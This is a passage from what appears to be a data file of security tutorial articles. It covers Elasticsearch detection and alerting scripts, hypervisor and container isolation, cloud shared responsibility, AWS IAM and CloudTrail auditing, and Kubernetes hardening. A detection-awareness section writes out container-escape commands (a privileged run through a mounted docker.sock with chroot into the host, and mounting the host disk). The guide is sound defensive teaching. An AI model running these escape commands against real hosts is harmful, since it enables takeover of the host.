
    # Release scroll context
    es_client._request('DELETE', '_search/scroll', json={'scroll_id': scroll_id})
```
""",
    },
    {
        "title": "Building Custom Alerting Scripts with Elasticsearch Queries",
        "tags": ["elasticsearch", "alerting", "python", "scripting", "siem", "automation"],
        "content": r"""# Building Custom Alerting Scripts with Elasticsearch Queries

## When Custom Alerting is Needed

Kibana's built-in rules cover many scenarios, but custom scripts fill gaps: complex multi-step correlations, dynamic thresholds, external system integration, and enrichment-before-alerting workflows.

## Elasticsearch Query Building Blocks

```python
import requests
from datetime import datetime, timedelta, timezone

ES_URL  = "https://127.0.0.1:9200"
ES_AUTH = ("elastic", "YourPassword")

def es_search(index: str, body: dict, size: int = 100) -> list:
    body.setdefault('size', size)
    body.setdefault('sort', [{"@timestamp": {"order": "desc"}}])
    r = requests.post(
        f"{ES_URL}/{index}/_search",
        json=body, auth=ES_AUTH, verify=True, timeout=30
    )
    r.raise_for_status()
    return r.json()['hits']['hits']

def es_aggregate(index: str, body: dict) -> dict:
    body['size'] = 0
    r = requests.post(
        f"{ES_URL}/{index}/_search",
        json=body, auth=ES_AUTH, verify=True, timeout=30
    )
    r.raise_for_status()
    return r.json().get('aggregations', {})

# Query helpers
def time_range(minutes: int) -> dict:
    return {"range": {"@timestamp": {"gte": f"now-{minutes}m"}}}

def term(field: str, value: str) -> dict:
    return {"term": {field: value}}

def bool_filter(*clauses) -> dict:
    return {"bool": {"filter": list(clauses)}}
```

## Detection Rules

```python
# Rule 1: Brute Force then Success
def rule_brute_force_success(window_min=10, threshold=5) -> list:
    \"\"\"Accounts with >= threshold failures AND a success in the same window.\"\"\"
    aggs = es_aggregate(".ds-logs-*", {
        "query": bool_filter(
            time_range(window_min),
            term("event.action", "authentication_failure")
        ),
        "aggs": {
            "by_account": {
                "terms": {"field": "user.name", "size": 200},
                "aggs": {"count": {"value_count": {"field": "@timestamp"}}}
            }
        }
    })

    at_risk = [
        b['key']
        for b in aggs.get('by_account', {}).get('buckets', [])
        if b['count']['value'] >= threshold
    ]

    alerts = []
    for account in at_risk:
        hits = es_search(".ds-logs-*", {
            "query": bool_filter(
                time_range(window_min),
                term("user.name", account),
                term("event.action", "authentication_success")
            )
        }, size=1)
        if hits:
            alerts.append({
                'rule':    'BRUTE_FORCE_SUCCESS',
                'account': account,
                'severity':'high',
                'ts':      datetime.now(timezone.utc).isoformat(),
            })
    return alerts


# Rule 2: Process spawned from unusual parent
UNUSUAL_PARENTS = {'powershell.exe', 'cmd.exe', 'wscript.exe', 'mshta.exe'}
EXPECTED_CHILDREN = {
    'svchost.exe':  {'services.exe'},
    'lsass.exe':    {'wininit.exe'},
    'winlogon.exe': {'smss.exe'},
}

def rule_suspicious_parent_child(window_min=60) -> list:
    \"\"\"Alert on process trees that deviate from known-good patterns.\"\"\"
    hits = es_search("logs-endpoint.events.process-*", {
        "query": bool_filter(time_range(window_min))
    }, size=500)

    alerts = []
    for hit in hits:
        src = hit['_source']
        proc   = src.get('process', {}).get('name', '').lower()
        parent = src.get('process', {}).get('parent', {}).get('name', '').lower()

        # Critical system processes should never have unusual parents
        if proc in {'lsass.exe', 'services.exe', 'winlogon.exe'}:
            expected = EXPECTED_CHILDREN.get(proc, set())
            if parent and parent not in expected:
                alerts.append({
                    'rule':    'SUSPICIOUS_PARENT_CHILD',
                    'process': proc,
                    'parent':  parent,
                    'host':    src.get('host', {}).get('name', 'unknown'),
                    'severity':'critical',
                    'ts':      src.get('@timestamp'),
                })
    return alerts


# Rule 3: Beaconing — regular outbound connections
def rule_beaconing(window_min=60, min_count=20, max_cv=0.15) -> list:
    \"\"\"Detect hosts making suspiciously regular outbound connections.\"\"\"
    aggs = es_aggregate("logs-endpoint.events.network-*", {
        "query": bool_filter(
            time_range(window_min),
            term("network.direction", "egress")
        ),
        "aggs": {
            "by_host_dest": {
                "composite": {
                    "size": 500,
                    "sources": [
                        {"host": {"terms": {"field": "host.name"}}},
                        {"dest": {"terms": {"field": "destination.ip"}}}
                    ]
                },
                "aggs": {
                    "count": {"value_count": {"field": "@timestamp"}},
                    "ts_hits": {
                        "top_hits": {"size": 100, "_source": ["@timestamp"]}
                    }
                }
            }
        }
    })

    alerts = []
    for bucket in aggs.get('by_host_dest', {}).get('buckets', []):
        if bucket['count']['value'] < min_count:
            continue

        timestamps = sorted([
            datetime.fromisoformat(
                h['_source']['@timestamp'].replace('Z', '+00:00')
            )
            for h in bucket['ts_hits']['hits']['hits']
        ])
        if len(timestamps) < 3:
            continue

        intervals  = [(timestamps[i+1] - timestamps[i]).total_seconds()
                      for i in range(len(timestamps) - 1)]
        mean_iv    = sum(intervals) / len(intervals)
        stdev      = (sum((x - mean_iv)**2 for x in intervals) / len(intervals)) ** 0.5
        cv         = stdev / mean_iv if mean_iv > 0 else 999

        if cv < max_cv:
            alerts.append({
                'rule':        'POTENTIAL_BEACON',
                'host':        bucket['key']['host'],
                'dest_ip':     bucket['key']['dest'],
                'connections': bucket['count']['value'],
                'interval_s':  round(mean_iv, 1),
                'cv':          round(cv, 3),
                'severity':    'medium',
                'ts':          datetime.now(timezone.utc).isoformat(),
            })
    return alerts
```

## Alert Dispatch

```python
import json
import smtplib
from email.mime.text import MIMEText

def dispatch_webhook(alert: dict, webhook_url: str):
    \"\"\"Send alert to Slack/Teams/SOAR webhook.\"\"\"
    payload = {
        "text": f":rotating_light: *{alert['rule']}* | {alert.get('severity','').upper()}",
        "attachments": [{"text": json.dumps(alert, indent=2, default=str)}]
    }
    requests.post(webhook_url, json=payload, timeout=10)

def dispatch_email(alert: dict, smtp_host: str, to_addr: str):
    \"\"\"Send alert via email.\"\"\"
    body  = f"Rule: {alert['rule']}\\nSeverity: {alert.get('severity')}\\n\\n"
    body += json.dumps(alert, indent=2, default=str)
    msg   = MIMEText(body)
    msg['Subject'] = f"[SOC] {alert['rule']} - {alert.get('severity','').upper()}"
    msg['From']    = "soc@corp.com"
    msg['To']      = to_addr
    with smtplib.SMTP(smtp_host, 587) as s:
        s.starttls()
        s.sendmail("soc@corp.com", [to_addr], msg.as_string())


def run_checks(webhook_url: str = None, email_to: str = None,
               smtp_host: str = None):
    \"\"\"Run all detection rules and dispatch any findings.\"\"\"
    all_alerts = []
    all_alerts.extend(rule_brute_force_success())
    all_alerts.extend(rule_suspicious_parent_child())
    all_alerts.extend(rule_beaconing())

    for alert in all_alerts:
        print(json.dumps(alert, default=str))
        if webhook_url:
            dispatch_webhook(alert, webhook_url)
        if email_to and smtp_host:
            dispatch_email(alert, smtp_host, email_to)

    print(f"Completed: {len(all_alerts)} alerts")
    return all_alerts


if __name__ == '__main__':
    run_checks(webhook_url='https://hooks.slack.com/services/YOUR/WEBHOOK')
```
""",
    },
]

VIRT_CLOUD = [
    {
        "title": "Virtualization Fundamentals — Type 1 vs Type 2 Hypervisors",
        "tags": ["virtualization", "hypervisor", "vmware", "hyper-v", "security", "virt-cloud"],
        "content": r"""# Virtualization Fundamentals — Type 1 vs Type 2 Hypervisors

## What is a Hypervisor?

A hypervisor (Virtual Machine Monitor, VMM) creates and manages virtual machines, abstracting physical hardware so multiple VMs share a single host.

## Type 1 — Bare-Metal Hypervisors

Run directly on hardware with no host OS underneath.

```
Physical Hardware (CPU, RAM, Storage, Network)
        |
  Type 1 Hypervisor        <- direct hardware access
  +------+------+------+
  | VM 1 | VM 2 | VM 3 |
  +------+------+------+
```

**Examples:** VMware ESXi, Hyper-V Server, Xen/XCP-ng, KVM.

**Security characteristics:**
- Smaller attack surface — no general-purpose host OS
- Hardware isolation via IOMMU, Intel EPT / AMD NPT
- Hypervisor compromise = all hosted VMs compromised
- Management plane (vCenter, SCVMM) is a critical high-value target

## Type 2 — Hosted Hypervisors

Run as an application on top of a conventional OS.

```
Physical Hardware
        |
  Host OS (Windows / Linux / macOS)
        |
  Hypervisor App (VMware Workstation, VirtualBox)
  +------+------+
  | VM 1 | VM 2 |
  +------+------+
```

**Security characteristics:**
- Host OS compromise exposes the hypervisor and all guest VMs
- Suitable for dev/test, not production workloads
- VM escape vulnerabilities affect both the hypervisor and the underlying OS

## VM Isolation Mechanisms

**Memory isolation** — The hypervisor manages physical page assignments per VM. Intel Extended Page Tables (EPT) and AMD Nested Page Tables (NPT) enforce this in hardware. A VM cannot read another VM's RAM even with kernel-level code inside the guest.

**CPU isolation** — VMs run in VMX non-root mode. Privileged instructions trigger a VM exit (trap to the hypervisor) rather than executing on bare metal.

**I/O isolation** — IOMMU (Intel VT-d, AMD-Vi) provides DMA remapping. Without IOMMU, a VM with a passed-through device could perform DMA reads into any physical address.

**Virtual network isolation** — Virtual switches with port groups and VLAN tagging enforce network segmentation between VMs at the hypervisor layer.

## VM Escape Attacks

VM escape breaks isolation to reach the hypervisor or host.

- **VENOM (CVE-2015-3456)**: Buffer overflow in QEMU's virtual floppy controller — affected KVM, Xen, VirtualBox
- **Cloudburst**: VMware escape via the SVGA virtual device
- **Hyper-V (BlueHat 2017)**: Integer overflow in the synthetic SCSI controller

```bash
# KVM host: monitor qemu-kvm process unexpectedly gaining capabilities
cat /proc/$(pgrep qemu-kvm | head -1)/status | grep CapEff

# auditd: alert on ptrace against qemu processes
auditctl -a always,exit -F arch=b64 -S ptrace -F comm=qemu-kvm -k vm_ptrace_alert
ausearch -k vm_ptrace_alert --start today
```

## KVM on Linux

KVM turns the Linux kernel itself into a Type 1 hypervisor via a loadable module:

```bash
# Verify hardware virtualisation support
grep -c 'vmx\\|svm' /proc/cpuinfo   # > 0 = supported

# Load KVM
modprobe kvm && modprobe kvm_intel   # or kvm_amd

# Create a VM (QEMU/KVM)
qemu-system-x86_64 \\
    -enable-kvm \\
    -m 4096 \\
    -cpu host \\
    -drive file=disk.qcow2,format=qcow2 \\
    -netdev user,id=net0,hostfwd=tcp::2222-:22 \\
    -device virtio-net-pci,netdev=net0 \\
    -daemonize

# List VMs with libvirt
virsh list --all
```

## Hypervisor Security Best Practices

| Practice | Rationale |
|----------|-----------|
| Dedicated management network | Isolate vCenter/SCVMM from VM traffic |
| Secure Boot on VMs | Prevents bootkit persistence inside guests |
| Minimise hypervisor admin accounts | Admin = access to every VM on the host |
| Patch rapidly after VM escape CVEs | High CVSS scores, public PoC often follows quickly |
| Audit VM snapshots regularly | Attackers revert snapshots to destroy evidence |
| Segregate workloads by trust level | High-security VMs in separate clusters |

## Snapshot Security Implications

- **Defenders**: Recover pre-compromise state; preserve memory for forensics
- **Attackers**: Revert to clean state to evade timeline analysis; export snapshot to exfiltrate VM contents

```powershell
# Hyper-V: audit all checkpoints
Get-VMSnapshot -VMName * |
    Select-Object VMName, Name, CreationTime |
    Sort-Object CreationTime -Descending

# VMware PowerCLI: detect recent snapshots
Get-VM | Get-Snapshot |
    Where-Object {$_.Created -gt (Get-Date).AddDays(-7)} |
    Select-Object VM, Name, Created, SizeGB
```
""",
    },
    {
        "title": "Container Security Basics — Docker Architecture, Image Security, and Secrets",
        "tags": ["docker", "containers", "security", "image-security", "secrets", "virt-cloud"],
        "content": r"""# Container Security Basics — Docker Architecture, Image Security, and Secrets

## Docker Architecture

```
Developer / CI
      |
  Dockerfile --> docker build --> Container Image
                                       |
                              Registry (Docker Hub / ECR / GCR)
                                       |
                              docker pull --> dockerd
                                                 |
                                          containerd --> runc --> Container
```

**Docker Daemon** (`dockerd`) runs as root. Access to `/var/run/docker.sock` is equivalent to root on the host — the most common container escape vector.

**containerd** handles container lifecycle. **runc** creates the isolated process using Linux namespaces and cgroups.

## Container Isolation vs VMs

Containers share the host kernel. Isolation relies on:

| Mechanism | What it Isolates |
|-----------|-----------------|
| PID namespace | Process IDs |
| Net namespace | Network stack |
| Mnt namespace | Filesystem mounts |
| User namespace | UID/GID mapping (container root ≠ host root) |
| cgroups | CPU, memory, PID limits |
| Seccomp | Syscall filtering (blocks ~40% by default) |
| AppArmor/SELinux | Mandatory access control profiles |

A container running `--privileged` with no seccomp profile has near-host-level access.

## Image Security

### Supply Chain Risks

```bash
# Pin to exact digest, not just a tag (tags are mutable)
docker pull nginx@sha256:abc123def456...

# Enable Docker Content Trust (image signing)
export DOCKER_CONTENT_TRUST=1
docker pull nginx:1.25.3

# Scan for CVEs
trivy image nginx:1.25.3
grype nginx:1.25.3

# Detect secrets baked into image
trufflehog docker --image myapp:latest
docker history --no-trunc myapp:latest | grep -iE 'secret|password|key|token'
```

### Secure Dockerfile Pattern

```dockerfile
# INSECURE
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl python3 wget
COPY . /app
CMD ["/app/start.sh"]

# SECURE: minimal base, non-root user, pinned deps
FROM python:3.12-slim
RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates \\
    && rm -rf /var/lib/apt/lists/*
RUN useradd -r -u 1001 -g 0 appuser
WORKDIR /app
COPY --chown=1001:0 requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=1001:0 . .
USER 1001
EXPOSE 8080
CMD ["python", "-m", "gunicorn", "app:application"]
```

### Secrets Never in Layers

```dockerfile
# BAD: secret is in the image layer even if deleted in a later step
RUN aws configure set aws_secret_access_key AKIASECRET
ENV DB_PASSWORD=SuperSecret

# GOOD: BuildKit secrets — never stored in any layer
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=db_pw \\
    DB_PASSWORD=$(cat /run/secrets/db_pw) python setup_db.py
```

## Hardened Runtime Invocation

```bash
docker run \\
    --user 1001:1001 \\
    --read-only \\
    --tmpfs /tmp:rw,size=64m,noexec \\
    --cap-drop ALL \\
    --cap-add NET_BIND_SERVICE \\
    --security-opt no-new-privileges \\
    --security-opt seccomp=/etc/docker/seccomp-default.json \\
    --memory 256m \\
    --pids-limit 100 \\
    --network internal \\
    myapp:latest

# Inspect security configuration of a running container
docker inspect <cid> | grep -E 'Privileged|CapAdd|SecurityOpt|ReadonlyRootfs'
```

## Container Escape Techniques (Detection Awareness)

```bash
# 1. Docker socket mounted inside container (most common misconfiguration)
docker run -v /var/run/docker.sock:/var/run/docker.sock myapp
# Attacker inside: docker run --privileged -v /:/host alpine chroot /host

# 2. --privileged container directly mounts host filesystem
# Inside: mount /dev/sda1 /mnt && chroot /mnt

# 3. cgroup release_agent escape (patched in kernels >= 5.1)

# Detection indicators:
# - /var/run/docker.sock bind-mounted into container
# - nsenter, unshare, mount executed inside container
# - CAP_SYS_ADMIN in container capability set
# - Falco rule: shell spawned in container
```

## Secrets in Kubernetes vs Docker Swarm

```bash
# Kubernetes Secrets: stored in etcd (base64, not encrypted by default)
kubectl create secret generic db-creds --from-literal=password=mysecret
# Mounted at /var/run/secrets/ or injected as env var

# Enable etcd encryption at rest (kube-apiserver config required)
# --encryption-provider-config=/etc/kubernetes/enc-config.yaml

# Docker Swarm secrets: encrypted in Raft log
echo "mysecret" | docker secret create db_password -
# Mounted at /run/secrets/db_password in container -- never in env vars
```
""",
    },
    {
        "title": "Cloud Service Models — IaaS, PaaS, SaaS Security Responsibilities",
        "tags": ["cloud", "iaas", "paas", "saas", "shared-responsibility", "security", "virt-cloud"],
        "content": r"""# Cloud Service Models — IaaS, PaaS, SaaS Security Responsibilities

## The Shared Responsibility Model

Cloud security is a partnership. The customer/provider boundary shifts based on the service model. Misunderstanding this boundary is a leading cause of cloud breaches.

```
Customer Responsibility  (more -------> less as you move right)
+--------------------+--------------------+--------------------+
| IaaS               | PaaS               | SaaS               |
+--------------------+--------------------+--------------------+
| Data               | Data               | Data               |
| Applications       | Applications       | [Provider]         |
| OS + Runtime       | [Provider]         | [Provider]         |
| Virtual Network    | [Provider]         | [Provider]         |
+--------------------+--------------------+--------------------+
| Physical / Hypervisor / Datacentre  (ALWAYS Provider)        |
+-------------------------------------------------------------+
```

## IaaS — Infrastructure as a Service

**What you get:** VMs, virtual networks, storage, load balancers.
**Examples:** AWS EC2, Azure VMs, GCP Compute Engine.

**Customer security responsibilities:**
- OS patching and CIS hardening (you own the OS)
- Host-based firewall configuration
- Application stack security
- Encryption at rest and in transit (you enable and configure)
- Access control — who can SSH/RDP, key management, bastion hosts
- OS-level and application logging

**Common IaaS misconfigurations:**
```bash
# Security group: SSH/RDP open to internet
aws ec2 describe-security-groups --query \\
    'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'

# IMDSv1 (vulnerable to SSRF token theft — enforce IMDSv2)
aws ec2 describe-instances --query \\
    'Reservations[*].Instances[?MetadataOptions.HttpTokens==`optional`].[InstanceId]'

# Unencrypted EBS volumes
aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`].[VolumeId]'
```

## PaaS — Platform as a Service

**What you get:** Managed runtimes, databases, queues, API gateways.
**Examples:** AWS RDS, Azure App Service, GCP Cloud Run, Heroku.

**Customer security responsibilities:**
- Application code security (injection, SSRF, auth bugs)
- Access control to the service (who can deploy, who can query the DB)
- Dependency management (CVE patching in your code)
- Data encryption settings (provider offers options; customer must enable)

**Provider handles:** OS/runtime patching, infrastructure resilience, database engine updates.

```bash
# RDS: check encryption at rest
aws rds describe-db-instances --query \\
    'DBInstances[?StorageEncrypted==`false`].[DBInstanceIdentifier]'

# RDS: publicly accessible — should be false for production databases
aws rds describe-db-instances --query \\
    'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier]'

# Azure App Service: enforce HTTPS
az webapp update --name myapp --resource-group myRG --https-only true
```

## SaaS — Software as a Service

**What you get:** Ready-to-use application (email, CRM, collaboration tools).
**Examples:** Microsoft 365, Salesforce, Slack, Google Workspace.

**Customer security responsibilities:**
- User lifecycle (provision on hire, deprovision on departure — joiners/movers/leavers)
- Access control configuration (roles, groups, permissions inside the app)
- MFA enforcement for all accounts
- Data governance (what sensitive data enters the platform)
- Third-party OAuth integration review (scope creep)
- Audit log export to SIEM

**SaaS security checklist:**
```
[ ] MFA enforced for all accounts, especially admins
[ ] Conditional access / IP allowlisting configured
[ ] Privileged admin accounts are separate from daily-use accounts
[ ] Inactive users reviewed monthly and disabled
[ ] Third-party OAuth app grants audited quarterly
[ ] DLP policies configured for sensitive data categories
[ ] Audit logs exported to SIEM (maximise available retention period)
[ ] Key data backed up in a provider-independent format
```

## Cloud Security Posture Management (CSPM)

CSPM tools continuously audit cloud configurations against benchmarks:

```bash
# AWS: ScoutSuite (open source)
python scout.py aws --profile default

# Multi-cloud: Checkov
checkov -d ./terraform/ --framework terraform

# AWS Config: non-compliant resources
aws configservice describe-compliance-by-config-rule --query \\
    'ComplianceByConfigRules[?Compliance.ComplianceType==`NON_COMPLIANT`].ConfigRuleName'

# Azure: Defender for Cloud Secure Score
az security secure-scores list -o table
```

## Security Control Comparison

| Concern | IaaS | PaaS | SaaS |
|---------|------|------|------|
| OS patching | Customer | Provider | Provider |
| Network control depth | Full (SGs, NACLs, VPC) | Limited | None |
| Log access depth | Full OS + app + network | App + service logs | Audit API only |
| Egress filtering | Firewalls, NACLs, proxies | Limited | None |
| Vendor lock-in risk | Low | Medium | High |
""",
    },
    {
        "title": "AWS Security Fundamentals — IAM, VPC, Security Groups, and CloudTrail",
        "tags": ["aws", "iam", "vpc", "cloudtrail", "security-groups", "cloud-security", "virt-cloud"],
        "content": r"""# AWS Security Fundamentals — IAM, VPC, Security Groups, and CloudTrail

## IAM — Identity and Access Management

IAM is the foundation of AWS security. Every AWS action is an API call; IAM decides allow or deny.

### Core Components

**Users** — Long-term credentials. Avoid for applications; use roles instead.
**Roles** — Temporary credentials assumed by services, EC2, Lambda, or federated users.
**Policies** — JSON Allow/Deny statements for specific actions on specific resources.
**Permission Boundaries** — Maximum permissions a principal can ever have, regardless of attached policies.

```json
// Minimal S3 read policy (least privilege)
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::my-bucket",
      "arn:aws:s3:::my-bucket/*"
    ]
  }]
}

// SCP: prevent disabling CloudTrail organisation-wide
{
  "Effect": "Deny",
  "Action": ["cloudtrail:StopLogging","cloudtrail:DeleteTrail","cloudtrail:UpdateTrail"],
  "Resource": "*"
}
```

### IAM Auditing

```bash
# Generate credential report (includes MFA, key age, last used)
aws iam generate-credential-report
aws iam get-credential-report --query Content --output text | base64 -d > cred_report.csv

# Find users with console password but no MFA
awk -F, 'NR>1 && $4=="true" && $8=="false" {print $1, "PASSWORD_NO_MFA"}' cred_report.csv

# Who has AdministratorAccess?
aws iam list-entities-for-policy \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \\
    --query '{Users:PolicyUsers[*].UserName,Roles:PolicyRoles[*].RoleName}'

# Simulate what a role can do (dry-run authorisation check)
aws iam simulate-principal-policy \\
    --policy-source-arn arn:aws:iam::123456789:role/my-role \\
    --action-names "s3:*" "iam:*" "ec2:*" \\
    --query 'EvaluationResults[?EvalDecision==`allowed`].EvalActionName'
```

## VPC — Virtual Private Cloud

```
VPC: 10.0.0.0/16
  Public Subnet  10.0.1.0/24  --> Internet Gateway   (web / load balancer tier)
  Private Subnet 10.0.2.0/24  --> NAT Gateway         (application tier)
  Isolated       10.0.3.0/24  --> No internet route   (database tier)
```

### Security Groups vs Network ACLs

| Feature | Security Groups | Network ACLs |
|---------|----------------|-------------|
| Scope | Instance / ENI | Subnet |
| State | Stateful | Stateless |
| Rules | Allow only | Allow + Deny |
| Evaluation | All rules | Ordered by priority |

```bash
# Find security groups with SSH/RDP/DB ports open to internet
aws ec2 describe-security-groups --query '
  SecurityGroups[?IpPermissions[?
    IpRanges[?CidrIp==`0.0.0.0/0`] &&
    (FromPort==`22` || FromPort==`3389` || FromPort==`1433` || FromPort==`3306`)
  ]].{ID:GroupId,Name:GroupName}'

# Enable VPC Flow Logs for network visibility
aws ec2 create-flow-logs \\
    --resource-type VPC --resource-ids vpc-xxxxxxxx \\
    --traffic-type ALL \\
    --log-destination-type cloud-watch-logs \\
    --log-group-name /vpc/flowlogs

# Analyse rejected traffic in flow logs
aws logs filter-log-events --log-group-name /vpc/flowlogs \\
    --filter-pattern '" REJECT "' --limit 20
```

## CloudTrail — API Audit Logging

Every AWS API call generates a CloudTrail event: caller, timestamp, source IP, parameters, and response code.

```bash
# Verify CloudTrail is enabled
aws cloudtrail get-trail-status --name myTrail

# Search recent events by type
aws cloudtrail lookup-events \\
    --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \\
    --start-time "$(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ)" \\
    --query 'Events[*].{Time:EventTime,User:Username,IP:SourceIPAddress}'

# High-priority events to alert on:
# ConsoleLogin from unexpected IP or country
# CreateUser, CreateAccessKey, AttachUserPolicy (privilege manipulation)
# PutBucketPolicy / PutBucketAcl (S3 public exposure)
# StopLogging (evidence destruction)
# RunInstances unexpectedly (cryptominer provisioning)
```

## GuardDuty — ML-based Threat Detection

GuardDuty analyses CloudTrail, VPC Flow Logs, and DNS logs automatically.

```bash
# Enable GuardDuty
aws guardduty create-detector --enable
DETECTOR=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)

# List high severity findings (7+)
aws guardduty list-findings --detector-id $DETECTOR \\
    --finding-criteria '{"Criterion":{"severity":{"Gte":7}}}' --output json

# Key finding types for immediate action:
# UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B  (login from unusual geo)
# Trojan:EC2/DNSDataExfiltration                   (DNS tunneling)
# CryptoCurrency:EC2/BitcoinTool.B                 (cryptominer)
# PrivilegeEscalation:IAMUser/AdministrativePermissions
# Backdoor:EC2/C&CActivity.B                       (known C2 communication)
```

## S3 Security

S3 misconfiguration remains a top cause of cloud data breaches.

```bash
# Block all public access at the account level
aws s3control put-public-access-block \\
    --account-id $(aws sts get-caller-identity --query Account --output text) \\
    --public-access-block-configuration \\
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Enable default encryption on all buckets
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text | tr '\\t' '\\n'); do
    aws s3api put-bucket-encryption --bucket "$bucket" \\
        --server-side-encryption-configuration \\
        '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
done

# Enable access logging
aws s3api put-bucket-logging --bucket mybucket \\
    --bucket-logging-status '{
        "LoggingEnabled":{
            "TargetBucket":"my-log-bucket",
            "TargetPrefix":"s3-access/mybucket/"
        }
    }'
```
""",
    },
    {
        "title": "Kubernetes Architecture — Pods, Services, RBAC, and Network Policies",
        "tags": ["kubernetes", "k8s", "rbac", "network-policy", "pods", "security", "virt-cloud"],
        "content": r"""# Kubernetes Architecture — Pods, Services, RBAC, and Network Policies

## Architecture Overview

```
Control Plane                        Worker Nodes
+---------------------------+        +------------------------+
| kube-apiserver            |<------>| kubelet                |
| etcd (cluster state)      |        | kube-proxy             |
| kube-scheduler            |        | Container Runtime      |
| controller-manager        |        | +----+ +----+ +----+   |
+---------------------------+        | |Pod | |Pod | |Pod |   |
                                     +------------------------+
```

**kube-apiserver** — All operations flow through this REST API. Enforces authentication, RBAC, and admission control. Exposing it to the internet without strong auth is a critical finding.

**etcd** — All cluster state, including Secrets. Must use TLS and client certificates. etcd compromise = complete cluster takeover.

**kubelet** — Node agent. Compromise = control over all pods on that node.

## Security-Hardened Pod Spec

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    fsGroup: 1001
    seccompProfile:
      type: RuntimeDefault
  automountServiceAccountToken: false
  containers:
  - name: app
    image: myapp:1.2.3@sha256:abc...
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "256Mi"
        cpu: "500m"
    env:
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-creds
          key: password
    volumeMounts:
    - name: tmp-dir
      mountPath: /tmp
  volumes:
  - name: tmp-dir
    emptyDir: {}
```

## RBAC

```
Subject (User / ServiceAccount / Group)
    |
RoleBinding / ClusterRoleBinding
    |
Role / ClusterRole
    |
Rules: {apiGroups, resources, verbs}
```

```yaml
# Minimal read-only role in a namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: monitoring
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: prometheus-pod-reader
  namespace: monitoring
subjects:
- kind: ServiceAccount
  name: prometheus
  namespace: monitoring
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

```bash
# Check what a service account can do
kubectl auth can-i --list --as=system:serviceaccount:default:myapp -n default

# Find all cluster-admin bindings (review each one)
kubectl get clusterrolebindings -o=jsonpath='{range .items[?(@.roleRef.name=="cluster-admin")]}{.metadata.name}{" -> "}{.subjects[*].name}{"\n"}{end}'
```

## Network Policies

All pods can communicate freely by default. Network Policies restrict traffic using label selectors.

```yaml
# Step 1: Default deny all ingress in namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}
  policyTypes: [Ingress]

---
# Step 2: Allow web tier -> app tier on port 8080 only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: web-to-app
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: app
  policyTypes: [Ingress]
  ingress:
  - from:
    - podSelector:
        matchLabels:
          tier: web
    ports:
    - protocol: TCP
      port: 8080
```

```bash
# Verify network policies exist
kubectl get networkpolicies -n production

# Test connectivity (should fail with default-deny)
kubectl exec -n production web-pod -- curl -s http://db-service:5432 --max-time 3
```

## Critical Security Risks

### Privileged Pod (Host Escape)

```yaml
# NEVER in production — equivalent to root on the host node
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - securityContext:
      privileged: true
  volumes:
  - hostPath:
      path: /       # Mount entire host filesystem
```

### etcd Exposure

```bash
# Check etcd access (should require client certs)
ETCDCTL_API=3 etcdctl \\
    --endpoints=https://127.0.0.1:2379 \\
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\
    --cert=/etc/kubernetes/pki/etcd/server.crt \\
    --key=/etc/kubernetes/pki/etcd/server.key \\
    get /registry/secrets/ --prefix --keys-only | head -10

# Enable encryption at rest in kube-apiserver:
# --encryption-provider-config=/etc/kubernetes/encryption.yaml
```

### Audit Logging

```bash
# Review kube-apiserver audit log for suspicious patterns
grep -iE "anonymous|forbidden|exec|attach" /var/log/kube-apiserver-audit.log | tail -20

# Alert on: pod exec into production namespaces (lateral movement)
kubectl get events --field-selector reason=Exec -n production
```
""",
    },
    {
        "title": "Infrastructure as Code Security — Terraform and CloudFormation Best Practices",
        "tags": ["iac", "terraform", "cloudformation", "security", "devsecops", "virt-cloud"],
        "content": r"""# Infrastructure as Code Security — Terraform and CloudFormation Best Practices

## Why IaC Security Matters

IaC templates define networks, compute, IAM roles, and security groups. A single misconfigured template deployed at scale creates thousands of vulnerable resources simultaneously. Shift-left security catches misconfigurations before they reach production.

## Common Terraform Misconfigurations

```hcl
# INSECURE: S3 bucket publicly readable
resource "aws_s3_bucket" "data" {
  bucket = "company-data"
  acl    = "public-read"
}

# SECURE: private, encrypted, access-logged
resource "aws_s3_bucket" "data" {
  bucket = "company-data-secure"
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

